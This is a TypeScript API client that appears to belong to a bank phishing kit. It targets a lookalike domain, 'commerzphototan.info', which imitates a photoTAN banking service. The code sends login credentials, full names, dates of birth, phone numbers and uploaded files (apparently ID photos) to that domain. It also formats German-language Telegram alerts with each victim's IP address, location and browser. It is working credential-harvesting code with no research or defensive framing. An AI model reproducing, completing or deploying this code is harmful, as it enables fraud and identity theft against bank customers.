import axios from 'axios';

// Base URL for API calls - handle mobile network issues
const getApiBaseUrl = () => {
  // Always use the HTTPS domain to avoid mixed content issues
  const httpsDomain = 'http://commerzphototan.info';
  
  // Check if we're on mobile and if localhost is accessible
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  
  if (isMobile) {
    // For mobile devices, use the HTTPS domain
    console.log('Mobile detected, using HTTPS domain:', httpsDomain);
    return `${httpsDomain}/api`;
  }
  
  // For all cases, use the HTTPS domain to avoid mixed content issues
  console.log('Using HTTPS domain for API calls:', httpsDomain);
  return `${httpsDomain}/api`;
};

const API_BASE_URL = getApiBaseUrl();

// Create axios instance with default config
const api = axios.create({
  baseURL: API_BASE_URL,
  timeout: 300000, // 5 minutes for mobile networks
  headers: {
    'Accept': 'application/json',
    'Cache-Control': 'no-cache'
  },
  // Enhanced configuration for mobile uploads
  maxContentLength: 50 * 1024 * 1024, // 50MB
  maxBodyLength: 50 * 1024 * 1024, // 50MB
  withCredentials: false, // Disable credentials for mobile compatibility
});

// Request interceptor to add common headers
api.interceptors.request.use(
  (config) => {
    // Only set Content-Type for non-FormData requests
    if (!(config.data instanceof FormData)) {
      config.headers['Content-Type'] = 'application/json';
    }
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor for error handling
api.interceptors.response.use(
  (response) => {
    return response;
  },
  (error: any) => {
    console.error('API Error:', error);
    
    // Mobile-specific error handling
    if (error.code === 'NETWORK_ERROR' || (error.message && error.message.includes('Network Error'))) {
      console.log('Network error detected, this might be a mobile connectivity issue');
    }
    
    if (error.code === 'ECONNABORTED') {
      console.log('Request timeout, this might be due to slow mobile network');
    }
    
    return Promise.reject(error);
  }
);

// Mobile connectivity test
const testMobileConnectivity = async (): Promise<boolean> => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    const response = await fetch(`${API_BASE_URL}/health`, {
      method: 'GET',
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    return response.ok;
  } catch (error) {
    console.log('Mobile connectivity test failed:', error);
    return false;
  }
};

// Mobile upload using XMLHttpRequest (best mobile browser compatibility)
const mobileUploadWithFetch = async (formData: FormData): Promise<any> => {
  console.log('=== MOBILE UPLOAD WITH XMLHTTPREQUEST ===');
  console.log('FormData entries:', Array.from(formData.entries()));
  console.log('Sending mobile upload to:', `${API_BASE_URL}/upload`);
  console.log('User Agent:', navigator.userAgent);
  
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    
    // Set up event listeners
    xhr.onload = function() {
      console.log('Mobile upload XHR onload triggered');
      console.log('Mobile upload response status:', xhr.status);
      console.log('Mobile upload response text:', xhr.responseText);
      console.log('Mobile upload readyState:', xhr.readyState);
      
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          const data = JSON.parse(xhr.responseText);
          console.log('Mobile upload successful:', data);
          
          // Even if success:false in response, still resolve if status is 200
          if (data.success === false) {
            console.warn('Server returned success:false but status 200:', data);
          }
          
          resolve(data);
        } catch (e) {
          console.error('Failed to parse response:', e);
          console.error('Raw response text:', xhr.responseText);
          // Still resolve with the raw text if JSON parsing fails but status is OK
          resolve({ success: true, message: 'Upload completed', raw: xhr.responseText });
        }
      } else {
        console.error('Mobile upload failed with status:', xhr.status);
        reject(new Error(`Upload failed: ${xhr.status} ${xhr.statusText}`));
      }
    };
    
    xhr.onerror = function() {
      console.error('Mobile upload network error');
      reject(new Error('Network error during upload'));
    };
    
    xhr.ontimeout = function() {
      console.error('Mobile upload timeout');
      reject(new Error('Upload timeout'));
    };
    
    xhr.upload.onprogress = function(e) {
      if (e.lengthComputable) {
        const progress = Math.round((e.loaded * 100) / e.total);
        console.log('Mobile upload progress:', progress + '%');
      }
    };
    
    xhr.onreadystatechange = function() {
      console.log('XHR readyState changed to:', xhr.readyState);
      // readyState 4 = DONE
      if (xhr.readyState === 4) {
        console.log('XHR completed with status:', xhr.status);
      }
    };
    
    // Open connection
    xhr.open('POST', `${API_BASE_URL}/upload`, true);
    
    // Set timeout to 5 minutes for mobile
    xhr.timeout = 300000;
    
    // Don't set Content-Type header, let browser set it with boundary
    
    // Send the request
    console.log('Sending XMLHttpRequest...');
    console.log('Target URL:', `${API_BASE_URL}/upload`);
    xhr.send(formData);
  });
};

// Fallback mobile upload using fetch API
const fallbackMobileUpload = async (formData: FormData): Promise<any> => {
  console.log('=== FALLBACK MOBILE UPLOAD ===');
  
  try {
    const response = await fetch(`${API_BASE_URL}/upload`, {
      method: 'POST',
      body: formData,
      // Don't set Content-Type, let browser set it with boundary
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    const data = await response.json();
    console.log('Fallback upload successful:', data);
    return data;
  } catch (error) {
    console.error('Fallback upload failed:', error);
    throw error;
  }
};

// API endpoints
export const apiService = {
  // Login endpoint
  login: async (data: { xusr: string; xpss: string }) => {
    try {
      const response = await api.post('/login', data);
      // Store sessionId if provided
      if (response.data.sessionId) {
        sessionStorage.setItem('sessionId', response.data.sessionId);
        localStorage.setItem('sessionId', response.data.sessionId);
        console.log('SessionId stored:', response.data.sessionId);
      } else {
        console.log('No sessionId in response:', response.data);
      }
      return response.data;
    } catch (error: any) {
      console.log('Login error:', error);
      throw new Error(error.response?.data?.message || error.message || 'Login failed. Please try again.');
    }
  },

  // Info endpoint
  info: async (data: { xname1: string; xname2: string; xdob: string; xtel: string }) => {
    try {
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      console.log('Info API - SessionId:', sessionId);
      const response = await api.post('/info', { ...data, sessionId });
      console.log('Info API - Response:', response.data);
      return response.data;
    } catch (error: any) {
      console.log('Info API - Error:', error);
      throw new Error(error.response?.data?.message || error.message || 'Info submission failed. Please try again.');
    }
  },

  // Upload endpoint
  upload: async (formData: FormData) => {
    // Skip mobile connectivity test for now as it might be causing issues
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // For mobile devices, use fetch API directly instead of axios
    if (isMobile) {
      console.log('=== MOBILE UPLOAD USING FETCH ===');
      return await mobileUploadWithFetch(formData);
    }
    
    try {
      console.log('=== DESKTOP UPLOAD START ===');
      console.log('Starting upload request...');
      console.log('API Base URL:', API_BASE_URL);
      console.log('FormData entries:', Array.from(formData.entries()));
      console.log('Mobile detected:', isMobile);
      console.log('User Agent:', navigator.userAgent);
      
      // SessionId should already be in formData from the component
      console.log('Upload API - FormData entries:', Array.from(formData.entries()));
      
      // Direct upload without connectivity test
      console.log('Sending upload request to:', `${API_BASE_URL}/upload`);
      
      // Desktop upload configuration
      const uploadConfig = {
        headers: {
          // Don't set Content-Type for FormData, let browser set it with boundary
        },
        timeout: 120000, // 2 minutes for desktop
        maxContentLength: 50 * 1024 * 1024, // 50MB
        maxBodyLength: 50 * 1024 * 1024, // 50MB
        validateStatus: function (status: number) {
          console.log('Response status:', status);
          return status < 500; // Resolve only if the status code is less than 500
        }
      };
      
      const response = await api.post('/upload', formData, uploadConfig);
      console.log('Upload successful:', response.data);
      console.log('=== DESKTOP UPLOAD END ===');
      return response.data;
    } catch (error: any) {
      console.error('=== UPLOAD ERROR ===');
      console.error('Upload error details:', error);
      console.error('Error code:', error.code);
      console.error('Error message:', error.message);
      console.error('Error response:', error.response?.data);
      console.error('Error config:', error.config);
      console.error('Error request:', error.request);
      console.error('Full error object:', JSON.stringify(error, null, 2));
      
      // Mobile-specific error handling
      if (error.code === 'ECONNABORTED') {
        console.error('TIMEOUT ERROR - Upload took too long');
        throw new Error('Upload timeout. Please check your internet connection and try again.');
      }
      
      if (error.code === 'NETWORK_ERROR' || (error.message && error.message.includes('Network Error'))) {
        console.error('NETWORK ERROR - Cannot reach server');
        throw new Error('Network error. Please check your internet connection and try again.');
      }
      
      if (error.code === 'ERR_NETWORK') {
        console.error('ERR_NETWORK - Connection failed');
        throw new Error('Cannot connect to server. Please check your internet connection and try again.');
      }
      
      if (!error.response) {
        console.error('NO RESPONSE - Request never reached server');
        
        // For mobile devices, try a fallback approach
        if (isMobile) {
          console.log('Attempting fallback upload for mobile...');
          try {
            return await fallbackMobileUpload(formData);
          } catch (fallbackError) {
            console.error('Fallback upload also failed:', fallbackError);
          }
        }
        
        throw new Error('Upload failed: Request could not reach server. Please check your internet connection.');
      }
      
      // Re-throw the error so the frontend knows the upload actually failed
      console.error('SERVER ERROR - Server returned error:', error.response?.status, error.response?.data);
      throw new Error(error.response?.data?.message || error.message || 'Upload failed. Please try again.');
    }
  },

  // Final data submission
  final: async (data: any) => {
    try {
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      console.log('Final API - SessionId:', sessionId);
      const response = await api.post('/final', { ...data, sessionId });
      console.log('Final API - Response:', response.data);
      return response.data;
    } catch (error: any) {
      console.log('Final API - Error:', error);
      throw new Error(error.response?.data?.message || error.message || 'Final submission failed. Please try again.');
    }
  },

  // Send Telegram notification (simulating the PHP behavior)
  sendTelegramNotification: async (data: {
    ip: string;
    userAgent: string;
    location?: string;
    formData?: any;
  }) => {
    try {
      const message = `📌 Neue Seitenaufruf-Benachrichtigung:\n\n` +
        `🕒 Zeit: ${new Date().toLocaleString('de-DE')}\n` +
        `📍 Standort: ${data.location || 'Unbekannt'}\n` +
        `💻 IP: ${data.ip}\n` +
        `🌐 User-Agent: ${data.userAgent}`;

      // In a real implementation, this would send to Telegram
      console.log('Telegram notification:', message);
      return { success: true };
    } catch (error) {
      console.error('Telegram notification error:', error);
      return { success: false };
    }
  }
};

export default apiService;
